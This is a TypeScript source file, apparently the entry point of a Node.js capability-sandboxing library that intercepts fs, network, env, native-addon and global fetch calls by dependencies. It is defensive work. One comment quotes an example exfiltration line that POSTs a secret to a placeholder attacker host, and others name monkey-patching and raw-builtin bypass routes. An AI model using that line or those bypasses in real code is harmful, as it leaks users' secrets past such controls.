/**
 * @capwall/core — public entry point.
 *
 * `install(policy, mode)` turns capwall on for the current process: it patches the CJS
 * loader and (with `esm: true`, which the CLI preload sets) registers the ESM hook, so that
 * subsequent requires/imports of capability-sensitive core modules return capwall's shims,
 * which attribute each call to its owning package and evaluate it against `policy` under
 * `mode`.
 *
 * SCOPE. Mediated on BOTH the CJS require path and the ESM import path (roadmap M4 + M5):
 * fs; the six egress modules net/http/https/tls/http2/dgram — each registered separately,
 * because one module's shim never covers another (see docs/threat-model.md); child_process;
 * worker_threads; vm; and node:module, which is mediated to keep a dependency from
 * registering a loader hook ahead of capwall's (#61) rather than as a policy capability.
 * Two capabilities are NOT require-routed and are installed directly here: process.env
 * (installEnvGuard) and `native` .node addon loads (installNativeGate, a process.dlopen
 * patch — roadmap S2, gating only, never confinement).
 */
import { patchRequire, type RequirePatchHandle } from "./loader/require.js";
import { registerEsmHook, type EsmHookHandle } from "./loader/esm-hook.js";
import { liveCtx } from "./loader/live-context.js";
import { installNativeGate, type NativeGateHandle } from "./loader/native.js";
import { installEnvGuard, type EnvGuardHandle } from "./shims/env.js";
import {
  installGlobalEgressGuard,
  type GlobalEgressGuardHandle,
} from "./shims/global-egress.js";
import { resolveMaxFrames } from "./attribution/index.js";
import type { ShimContext } from "./shims/runtime.js";
import type { Decision } from "./policy/evaluate.js";
import type { Mode, Policy } from "@capwall/policy-schema";

export interface InstallHandle {
  /**
   * Remove capwall's interception (best-effort for ESM). Primarily for tests/teardown.
   *
   * WHAT THIS DOES AND DOES NOT UNDO (#62/#87). It restores the interception POINTS —
   * `Module._load`, `process.env`, `process.dlopen`, the egress globals — so a fresh
   * `require("node:fs")` or `process.env.X` after the last `uninstall()` is genuinely
   * un-mediated. It cannot revoke a reference a module already CAPTURED (`const fs =
   * require("node:fs")` at load time, an ESM `const` import binding, a stashed `process.env`).
   * Those captures follow the live policy, so once the last install is gone they see a deny-all
   * `enforce` policy and a dropped `onDecision` sink: they fail CLOSED and silently, rather than
   * continuing to serve the torn-down install's grants or writing decisions into its collector.
   *
   * Installs nest. `uninstall()` deactivates ONE install and re-exposes whichever is still
   * active — including for already-captured shims, which is the whole point of #87 — and works
   * in any order, not just LIFO.
   */
  uninstall(): void;
}

export interface InstallOptions {
  /**
   * Also register the ESM loader hook (roadmap M5, implemented). Off by default for
   * programmatic embedders — the CLI preload sets it to `true` unless `CAPWALL_ESM=0`.
   * Note that unregistering is best-effort: Node cannot fully remove a registered hook, so
   * ESM teardown is fail-closed rather than reversible (docs/threat-model.md § ESM known
   * limits).
   */
  esm?: boolean;
  /**
   * Called on EVERY capability decision (allowed and denied, both modes). This is the log
   * sink in observe mode and the trace source for `capwall gen-policy`. Defaults to a no-op.
   */
  onDecision?: (pkg: string, decision: Decision) => void;
  /**
   * Absolute project root. Used to resolve relative policy globs and to distinguish app
   * code from dependencies during attribution. Defaults to `process.cwd()`.
   */
  projectRoot?: string;
  /**
   * Gate `process.env` reads by dependencies against the `env` allowlist (the
   * anti-exfiltration control). On by default. Set `false` to leave `process.env` untouched
   * (e.g. if the Proxy overhead is a concern for a workload that reads env in a hot loop).
   */
  env?: boolean;
  /**
   * Mediate Node's GLOBAL egress APIs — `globalThis.fetch`, `WebSocket`, `EventSource` — against
   * the same `net` grant the module surfaces use (issue #80). On by default.
   *
   * These are globals, not module exports, so the loader interception never sees them: before
   * this existed, `fetch("https://attacker/", {method:"POST", body:secret})` from a dependency
   * succeeded under a deny-all `enforce` policy with NO decision recorded. Closing it means
   * writing to `globalThis`, which affects the app and every package at once — set `false` to
   * leave the globals untouched if that write is unacceptable in your process. `uninstall()`
   * always restores the originals; see `shims/global-egress.ts`.
   */
  globalEgress?: boolean;
  /** Tuning for the stack-walk attribution step. */
  attribution?: {
    /**
     * Max stack frames the attribution walk inspects (default 25 — {@link DEFAULT_MAX_FRAMES}).
     *
     * SECURITY (issue #15): the walk charges the call to the nearest dependency frame it
     * finds. If the owning dependency sits deeper than this budget (long promise chains,
     * heavily-wrapped utilities, async_hooks-heavy frameworks), the walk runs out of frames
     * and falls back to `<unknown>` — an ordinary deny-by-default principal since #60, so a
     * capped attribution now fails CLOSED (a benign deep stack is wrongly denied rather than
     * wrongly allowed, which is what falling back to `<app>` used to mean). The decision
     * carries `attributionTruncated: true` in that case, so the fix is to raise this budget
     * rather than to grant `<unknown>`. Raising it costs a longer walk on every mediated call
     * (see the <1ms/req budget in AGENTS.md § 5).
     *
     * Invalid values (non-integer, zero, negative, garbage) are IGNORED with a stderr warning
     * and the default is used — capwall must not crash a host app over a config typo.
     */
    maxFrames?: number;
  };
  /**
   * HARDENED MODE (opt-in, issue #17). `Object.freeze` the capability surfaces capwall hands
   * to dependencies — each shim namespace (`fs`, `fs.promises`, `net`, …), the guarded
   * wrapper functions on them, and every guarded subclass (`net.Socket`, `fs.ReadStream`,
   * `vm.Script`, `worker_threads.Worker`, `child_process.ChildProcess`, …) plus their
   * prototypes — so a dependency cannot `fs.readFileSync = evil` or
   * `net.Socket.prototype.connect = evil` its way past mediation.
   *
   * **Off by default, and it is not free:** freezing `fs` breaks `graceful-fs` (a transitive
   * dependency of npm, webpack, and much of the ecosystem) and every other legitimate `fs`
   * monkey-patcher, which is exactly why this is opt-in rather than the default. It is also
   * **not** a sandbox: it does nothing about `process.getBuiltinModule("node:fs")` or the
   * other raw-builtin paths. Read `docs/threat-model.md` § hardened mode before enabling it.
   */
  hardened?: boolean;
}

/**
 * Install capwall into the current process.
 *
 * Call as early as possible (before dependencies are required) so no package captures a raw,
 * un-shimmed builtin reference first. The CLI does this via a `--import` preload.
 *
 * @param policy validated policy (use {@link loadPolicy} to read a capabilities.json).
 * @param mode `"observe"` (log, never block) or `"enforce"` (deny-by-default, throw).
 */
export function install(
  policy: Policy,
  mode: Mode,
  options: InstallOptions = {},
): InstallHandle {
  const onDecision = options.onDecision ?? (() => {});
  const projectRoot = options.projectRoot ?? process.cwd();
  // Validated once, here, rather than per attribution: a bad value warns exactly once and
  // every shim then shares the identical (already-sane) budget. Never throws — see
  // resolveMaxFrames on why install-time config errors must fail open.
  const maxFrames = resolveMaxFrames(
    options.attribution?.maxFrames,
    "attribution.maxFrames",
  );
  const hardened = options.hardened === true;
  // THIS OBJECT IS THE INSTALL'S IDENTITY, not the thing shims read (#62/#87). It is pushed on
  // the shared install stack by `patchRequire` (and again by `registerEsmHook`), and popping it
  // is what deactivates this install. What every shim actually reads is `liveCtx`, the
  // long-lived box the stack re-points — see loader/live-context.ts.
  const ctx: ShimContext = { policy, mode, onDecision, projectRoot, maxFrames, hardened };
  const handles: Array<
    RequirePatchHandle | EsmHookHandle | EnvGuardHandle | NativeGateHandle | GlobalEgressGuardHandle
  > = [];
  // First: this pushes `ctx` onto the install stack, so `liveCtx` below already describes THIS
  // install by the time the guards that read it are built.
  handles.push(patchRequire(ctx));
  // The three guards below are handed `liveCtx`, NOT `ctx`. They are not import-routed, so each
  // one hands a dependency a long-lived object (the `process.env` proxy, the wrapped `fetch`, the
  // patched `process.dlopen`) that outlives its install exactly the way a captured `fs` shim
  // does. Binding them to the per-install `ctx` is what made `process.env` tighten on a policy
  // swap while `fs` did not (#87) — two capabilities in one process disagreeing about which
  // policy is in force, which is worse than either behaviour applied consistently.
  //
  // Native (`.node`) addon gate (roadmap S2, #49). Always on, and deliberately not routed
  // through the require registry: `process.dlopen` is the chokepoint EVERY addon load passes
  // through, including a direct `process.dlopen(...)` that never touches the module system.
  // See loader/native.ts. Gating only — capwall cannot confine an addon once it is loaded.
  handles.push(installNativeGate(liveCtx));
  if (options.env !== false) {
    handles.push(installEnvGuard(liveCtx));
  }
  // Global egress (#80). Not import-routed — `fetch`/`WebSocket`/`EventSource` are globals, so
  // like the env guard this is installed here rather than through the shim registry.
  if (options.globalEgress !== false) {
    handles.push(installGlobalEgressGuard(liveCtx));
  }
  if (options.esm) {
    handles.push(registerEsmHook(ctx));
  }
  return {
    uninstall() {
      for (const h of handles) h.uninstall();
    },
  };
}

// Re-export the real, usable pieces so consumers have one import surface.
export { CapabilityError } from "./errors.js";
export { evaluate, isGranted } from "./policy/evaluate.js";
export type { CapabilityRequest, Decision } from "./policy/evaluate.js";
export { loadPolicy, loadPolicyFromObject } from "./policy/load.js";
// IPC destination handling (#72): the CLI needs `canonicalIpcPath` for `capwall explain` and
// `placeholderizeIpcPath` to keep a generated policy portable across machines.
export {
  canonicalIpcPath,
  expandIpcPlaceholders,
  matchesIpcPath,
  placeholderizeIpcPath,
  IPC_HOME_PLACEHOLDER,
  IPC_PSEUDO_HOST,
  IPC_TMP_PLACEHOLDER,
  UNKNOWN_IPC_PATH,
} from "./policy/ipc.js";
export type { LoadPolicyOptions } from "./policy/load.js";
export {
  attributeCaller,
  attributeCallerDetailed,
  packageForPath,
  resolveMaxFrames,
  APP_ROOT,
  UNATTRIBUTED,
  DEFAULT_MAX_FRAMES,
} from "./attribution/index.js";
export type { Attribution, AttributionOptions } from "./attribution/index.js";
export type { DecisionSink } from "./shims/fs.js";
export type {
  Policy,
  PackagePolicy,
  Mode,
  CapabilityKind,
} from "@capwall/policy-schema";
